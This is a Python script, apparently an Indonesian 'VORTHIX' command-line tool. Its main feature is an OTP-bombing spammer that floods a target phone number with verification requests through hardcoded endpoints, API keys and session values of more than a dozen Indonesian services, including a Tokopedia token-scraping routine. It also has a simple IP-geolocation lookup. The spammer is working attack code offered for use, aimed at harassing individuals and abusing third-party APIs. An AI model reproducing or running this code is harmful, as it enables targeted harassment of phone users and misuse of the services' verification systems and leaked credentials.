#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import re
import pwd
import requests
import subprocess
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ---------- BACA ALLOWED UIDS DARI FILE (dengan nama & status) ----------
ALLOWED_FILE = "allowed.txt"
USER_DATA = {}  # uid -> (nama, status)

if os.path.exists(ALLOWED_FILE):
    with open(ALLOWED_FILE, 'r') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split(':')
            uid = int(parts[0].strip())
            name = parts[1].strip() if len(parts) > 1 else f"User{uid}"
            status = parts[2].strip() if len(parts) > 2 else "Active"
            USER_DATA[uid] = (name, status)
else:
    print(f"[!] File {ALLOWED_FILE} tidak ditemukan. Buat file dengan daftar UID.")
    sys.exit(1)

if not USER_DATA:
    print("[!] Tidak ada UID yang diizinkan. Tambahkan UID ke allowed.txt")
    sys.exit(1)

ALLOWED_UIDS = list(USER_DATA.keys())
TOTAL_USERS = len(ALLOWED_UIDS)

# ---------- KONFIGURASI ----------
HISTORY_FILE = "riwayat.log"
ADMIN_TELEGRAM = "maverick17036"

# ---------- BANNER VORTHIX (dengan jumlah user dinamis) ----------
BANNER = f"""
██╗   ██╗ ██████╗ ██████╗ ████████╗██╗  ██╗██╗██╗  ██╗
╚██╗ ██╔╝██╔═══██╗██╔══██╗╚══██╔══╝██║  ██║██║╚██╗██╔╝
 ╚████╔╝ ██║   ██║██████╔╝   ██║   ███████║██║ ╚███╔╝ 
  ╚██╔╝  ██║   ██║██╔══██╗   ██║   ██╔══██║██║ ██╔██╗ 
   ██║   ╚██████╔╝██║  ██║   ██║   ██║  ██║██║██╔╝ ██╗
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝

Author : Mave
Release: 25 Apr 2026
Version: 1.0.0
Users  : {TOTAL_USERS}

[ INFORMASI DARI Mave ]
Aku terlalu sibuk memperdulikan orang lain, sampai
aku sadar bahwa tak ada yang peduli denganku.
"""

# ---------- FUNGSI LOG (dengan username & status) ----------
def log_history(user_id, action, detail=''):
    try:
        username_system = pwd.getpwuid(user_id).pw_name
    except:
        username_system = f"uid{user_id}"
    user_name, user_status = USER_DATA.get(user_id, (username_system, "Unknown"))
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    with open(HISTORY_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] {user_name} ({username_system}, uid={user_id}) [{user_status}] → {action} {detail}\n")

# ---------- BUKA TELEGRAM ADMIN ----------
def open_telegram_admin(uid):
    msg = f"halo admin ini uid saya: {uid}"
    url = f"https://t.me/{ADMIN_TELEGRAM}"
    try:
        subprocess.run(["termux-open-url", url], check=False)
    except FileNotFoundError:
        try:
            subprocess.run(["xdg-open", url], check=False)
        except:
            print(f"\n[!] Gagal membuka Telegram. Buka manual: {url}")
    print(f"\n📱 Kirim pesan ke @{ADMIN_TELEGRAM}: \"{msg}\"")
    print("   (Pesan sudah di-copy ke clipboard? Silakan paste.)")

# ---------- CEK UID ----------
def check_uid():
    uid = os.getuid()
    if uid not in ALLOWED_UIDS:
        print(f"[!] UID {uid} tidak terdaftar.")
        open_telegram_admin(uid)
        sys.exit(1)
    return uid

# ---------- FUNGSI FORMAT NOMOR ----------
def format_phone(phone):
    raw = ''.join(filter(str.isdigit, phone))
    if len(raw) < 10:
        return None
    if raw.startswith('0'):
        phone62 = '62' + raw[1:]
    elif raw.startswith('62'):
        phone62 = raw
    else:
        return None
    return raw, phone62

# ==================== PLATFORM OTP (LENGKAP DARI JAVASCRIPT) ====================
OTP_PLATFORMS = [
    {
        "name": "Rumah123",
        "url": "https://www.rumah123.com/api/otp/request-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.rumah123.com"
        },
        "payload_template": "phoneNumber: {phone}, ipAddress: 103.166.26.108, portalId: 1, type: WHATSAPP"
    },
    {
        "name": "SATURDAYS",
        "url": "https://beta.api.saturdays.com/api/v1/user/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "Authorization": "undefined",
            "Content-Type": "application/json",
            "Country-Code": "ID",
            "Currency-Code": "IDR",
            "Device-Type": "mweb",
            "Platform": "mweb",
            "Origin": "https://saturdays.com",
            "Referer": "https://saturdays.com/",
            "X-Api-Key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj",
            "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site"
        },
        "payload_template": "number: {local_phone}, country_code: +62, type: "
    },
    {
        "name": "IRA - Internet Rakyat",
        "url": "https://internetrakyat.id/api/app/auth/send-otp-register",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json",
            "x-api-key": "280999!FTTH"
        },
        "payload_template": "phone_number: {phone}"
    },
    {
        "name": "Fastwork",
        "url": "https://api.fastwork.id/auth/v2/signup.sendVerificationCode",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json"
        },
        "payload_template": "phone_number: {phone_0}"
    },
    {
        "name": "Planet Ban",
        "url": "https://api.planetban.com/website/customer/request-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json"
        },
        "payload_template": "phone: {phone}"
    },
    {
        "name": "Pinhome",
        "url": "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://www.pinhome.id"
        },
        "payload_template": "accountType: customers, applicationType: Pinhome Web, countryCode: 62, medium: whatsapp, otpType: register, phoneNumber: {phone_no_0}"
    },
    {
        "name": "Tokopedia (WA)",
        "custom": True
    },
    {
        "name": "Bunda",
        "url": "https://cms.bunda.co.id/api/v1/auth/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.bunda.co.id",
            "Referer": "https://www.bunda.co.id/id",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Sec-Ch-Ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"'
        },
        "payload_template": "phone_number: {phone62}, type: auth"
    },
    {
        "name": "Dokterin",
        "url": "https://api.dokterin.id/user/v1/users/login",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9,id;q=0.8,pt;q=0.7",
            "content-type": "application/json",
            "origin": "https://partner.dokterin.co.id",
            "referer": "https://partner.dokterin.co.id/",
            "sec-ch-ua": '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "x-api-platform": "eyJhcHBfdmVyc2lvbiI6IjEuMC4wIiwicGxhdGZvcm0iOiJ3ZWIiLCJtYW51ZmFjdHVyZXIiOiJCbGluayIsInByb2R1Y3QiOiJDaHJvbWUiLCJkZXNjcmlwdGlvbiI6IkNocm9tZSAxNDkuMC4wLjAgb24gV2luZG93cyAxMCA2NC1iaXQiLCJ0aW1lem9uZSI6IkFzaWEvSmFrYXJ0YSJ9",
            "x-session-id": "79fe686a1ffa7825ee8c8003be523a2b"
        },
        "payload_template": "phone: {phone62}, tnc_accept: true, device: Blink, platform: web, host: https://partner.dokterin.co.id"
    },
    {
        "name": "Bonus Belanja",
        "url": "https://www.bonusbelanja.com/api/auth/registration/app",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9,id;q=0.8,pt;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://www.bonusbelanja.com",
            "Referer": "https://www.bonusbelanja.com/register/"
        },
        "payload_template": "phone: {phone08}, name: {random_name}, agreeTnc: true, agreeContact: true"
    },
    {
        "name": "Adiraku",
        "url": "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Origin": "https://www.adiraku.co.id",
            "Referer": "https://www.adiraku.co.id/"
        },
        "payload_template": "mobileNumber: {phone08}, type: prospect-create, channel: whatsapp"
    },
    {
        "name": "Paper.id",
        "url": "https://register.paper.id/api/v1/auth/register/send-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "X-Paper-User-Agent": "Jupiter/7.17.24 mobile web (linux) Chrome 139",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.paper.id",
            "Referer": "https://www.paper.id/",
            "Url": "https://www.paper.id/webappv1/register?disablemweb=1&utm_source=direct&utm_medium=direct&utm_campaign=",
            "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site"
        },
        "payload_template": "phone: {phone}, method: whatsapp, registered_by: web"
    },
    {
        "name": "Duniagames",
        "url": "https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id",
            "Claim-Type": "FR",
            "Content-Type": "application/json",
            "Origin": "https://duniagames.co.id",
            "Referer": "https://duniagames.co.id/",
            "Sec-Ch-Ua": '"Chromium";v="139", "Not-A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "X-Device": "fd283d16-f66f-431f-abdf-7ef32f5fe6d0"
        },
        "payload_template": "phoneNumber: +{phone62}, userName: {phone62}"
    }
]

# ---------- FUNGSI SEND OTP ----------
def send_otp(platform, phone, phone62):
    if platform.get('custom'):
        return send_tokopedia(phone62)

    url = platform['url']
    headers = platform['headers']
    payload_template = platform.get('payload_template', '')

    local_phone = phone[1:] if phone.startswith('0') else phone
    phone08 = '0' + phone[2:] if phone.startswith('62') else phone
    if not phone08.startswith('0'):
        phone08 = '0' + phone
    phone_no_0 = phone.lstrip('0')
    random_name = 'user' + str(time.time_ns())[-4:]

    fmt_dict = {
        'phone': phone,
        'phone62': phone62,
        'local_phone': local_phone,
        'phone08': phone08,
        'phone_no_0': phone_no_0,
        'random_name': random_name
    }

    payload = {}
    if payload_template:
        parts = payload_template.split(', ')
        for part in parts:
            if ': ' in part:
                k, v = part.split(': ', 1)
                if '{' in v:
                    v = v.format(**fmt_dict)
                payload[k.strip()] = v

    try:
        session = requests.Session()
        retries = Retry(total=2, backoff_factor=0.5)
        session.mount('http://', HTTPAdapter(max_retries=retries))
        session.mount('https://', HTTPAdapter(max_retries=retries))

        if platform['method'].upper() == 'POST':
            if 'Content-Type' in headers and 'application/json' in headers['Content-Type']:
                resp = session.post(url, json=payload, headers=headers, timeout=15)
            else:
                resp = session.post(url, data=payload, headers=headers, timeout=15)
        else:
            resp = session.get(url, params=payload, headers=headers, timeout=15)

        if resp.status_code in [200, 201, 202, 204]:
            return {'success': True, 'status': resp.status_code}
        else:
            return {'success': False, 'status': resp.status_code, 'error': resp.text[:100]}
    except Exception as e:
        return {'success': False, 'status': 0, 'error': str(e)}

def send_tokopedia(phone62):
    try:
        get_url = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone62}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{phone62}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Origin': 'https://accounts.tokopedia.com',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        get_resp = requests.get(get_url, headers=headers, timeout=10)
        match = re.search(r'<input\s+id="Token"\s+value="([^"]+)"\s+type="hidden"\s*/?>', get_resp.text, re.IGNORECASE)
        if not match:
            return {'success': False, 'status': 0, 'error': 'Token tidak ditemukan'}
        tk = match.group(1)

        post_url = 'https://accounts.tokopedia.com/otp/c/ajax/request-wa'
        data = {
            'otp_type': '116',
            'msisdn': phone62,
            'tk': tk,
            'email': '',
            'original_param': '',
            'user_id': '',
            'signature': '',
            'number_otp_digit': '6'
        }
        post_resp = requests.post(post_url, data=data, headers=headers, timeout=10)
        if post_resp.status_code in [200, 201, 202]:
            return {'success': True, 'status': post_resp.status_code}
        else:
            return {'success': False, 'status': post_resp.status_code, 'error': post_resp.text[:100]}
    except Exception as e:
        return {'success': False, 'status': 0, 'error': str(e)}

# ---------- IP TRACKER ----------
def track_ip(ip):
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10)
        data = resp.json()
        if data and not data.get('bogon'):
            return {
                'success': True,
                'ip': data.get('ip', ip),
                'hostname': data.get('hostname', '-'),
                'city': data.get('city', '-'),
                'region': data.get('region', '-'),
                'country': data.get('country', '-'),
                'loc': data.get('loc', '-'),
                'org': data.get('org', '-'),
                'timezone': data.get('timezone', '-')
            }
        resp2 = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query", timeout=10)
        data2 = resp2.json()
        if data2.get('status') == 'success':
            return {
                'success': True,
                'ip': data2.get('query', ip),
                'hostname': '-',
                'city': data2.get('city', '-'),
                'region': data2.get('regionName', '-'),
                'country': data2.get('country', '-'),
                'loc': '-',
                'org': data2.get('isp') or data2.get('org', '-'),
                'timezone': '-'
            }
        return {'success': False, 'message': 'IP tidak ditemukan'}
    except Exception as e:
        return {'success': False, 'message': str(e)}

# ---------- MENU ----------
def show_menu():
    print("\n" + "-" * 40)
    print("[ M E N U ]")
    print("-" * 40)
    print("[01] Spam OTP Brutal (Whatsapp + Sms + Telepon)")
    print("[02] Cek Informasi IP Address")
    print("[00] Keluar")
    print("-" * 40)

def spam_otp(uid):
    phone_input = input("📱 Masukkan nomor target (08/62): ").strip()
    formatted = format_phone(phone_input)
    if not formatted:
        print("[!] Nomor tidak valid. Harus diawali 08 atau 62.")
        return
    phone, phone62 = formatted
    print(f"[+] Target: {phone} (62: {phone62})")
    log_history(uid, "SPAM OTP", phone)

    success = 0
    fail = 0
    total = len(OTP_PLATFORMS)

    print(f"[*] Memulai spam ke {phone} ke {total} platform...")
    for idx, platform in enumerate(OTP_PLATFORMS, 1):
        print(f"  [{idx}/{total}] {platform['name']} ... ", end='', flush=True)
        result = send_otp(platform, phone, phone62)
        if result['success']:
            print(f"✅ HTTP {result['status']}")
            success += 1
        else:
            err = result.get('error', f"HTTP {result.get('status', 0)}")
            print(f"❌ {err}")
            fail += 1
        time.sleep(0.5)

    print(f"\n📊 Hasil: {success} berhasil, {fail} gagal")
    with open(HISTORY_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] HASIL SPAM {phone}: {success} OK, {fail} FAIL\n")

def ip_tracker(uid):
    target = input("🌐 Masukkan IP atau domain: ").strip()
    print(f"[+] Melacak {target}...")
    log_history(uid, "IP TRACK", target)
    info = track_ip(target)
    if not info['success']:
        print(f"[!] {info['message']}")
        return
    print("\n🌐 *IP Tracker*")
    print(f"📌 IP      : {info['ip']}")
    print(f"🏠 Hostname: {info['hostname']}")
    print(f"📍 Kota    : {info['city']}")
    print(f"🗺️ Region  : {info['region']}")
    print(f"🌍 Negara  : {info['country']}")
    print(f"📡 Lokasi  : {info['loc']}")
    print(f"🏢 ISP     : {info['org']}")
    print(f"⏰ Timezone: {info['timezone']}")

# ---------- MAIN ----------
def main():
    uid = check_uid()
    user_name, user_status = USER_DATA[uid]
    print(f"\n👤 Username: {user_name}")
    print(f"📊 Status  : {user_status}")
    print(BANNER)

    while True:
        show_menu()
        choice = input("[ P I L I H ]: ").strip()
        if choice == "01":
            spam_otp(uid)
        elif choice == "02":
            ip_tracker(uid)
        elif choice == "00":
            print("Keluar...")
            break
        else:
            print("[!] Pilihan tidak valid.")
        input("\nTekan Enter untuk melanjutkan...")

if __name__ == "__main__":
    main()